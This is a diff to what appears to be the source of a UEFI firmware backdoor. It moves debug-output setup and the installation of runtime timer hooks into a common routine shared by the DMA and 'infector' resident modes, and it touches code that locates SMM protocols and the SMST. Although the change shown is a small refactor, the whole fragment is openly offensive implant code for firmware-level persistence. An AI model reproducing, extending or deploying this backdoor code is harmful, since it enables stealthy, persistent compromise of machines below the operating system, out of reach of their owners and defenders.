@@ -1701,6 +1701,16 @@ VOID BackdoorResidentCommon(VOID *Image)
     // update image base address
     m_ImageBase = Image;
 
+    // for debug messages output on the screen
+    SimpleTextOutProtocolNotifyRegister();
+
+#ifdef USE_PERIODIC_TIMER
+
+    // install hooks to enable periodic timer during RT phase
+    BackdoorInitRuntimeHooks();
+
+#endif
+
     // locate SMM access 2 protocol
     if ((Status = m_BS->LocateProtocol(&gEfiSmmAccess2ProtocolGuid, NULL, (VOID **)&SmmAccess2)) == EFI_SUCCESS)
     {        
@@ -1751,16 +1761,6 @@ VOID BackdoorResidentDma(VOID *Image)
     // perform common initialization
     BackdoorResidentCommon(Image);
 
-    // for debug messages output on the screen
-    SimpleTextOutProtocolNotifyRegister();
-
-#ifdef USE_PERIODIC_TIMER
-
-    // install hooks to enable periodic timer during RT phase
-    BackdoorInitRuntimeHooks();
-
-#endif
-
     // report sucessfully executed DXE driver
     Status->Success += 1;
 
@@ -1799,17 +1799,6 @@ VOID BackdoorResidentInfector(VOID *Image)
             {
                 DbgMsg(__FILE__, __LINE__, "GetSmstLocation() ERROR 0x%x\r\n", Status);
             }
-        }
-        else
-        {
-            // for debug messages output on the screen
-            SimpleTextOutProtocolNotifyRegister();
-
-#ifdef USE_PERIODIC_TIMER
-
-            // install hooks to enable periodic timer during RT phase
-            BackdoorInitRuntimeHooks();
-#endif
         }
     }
     else
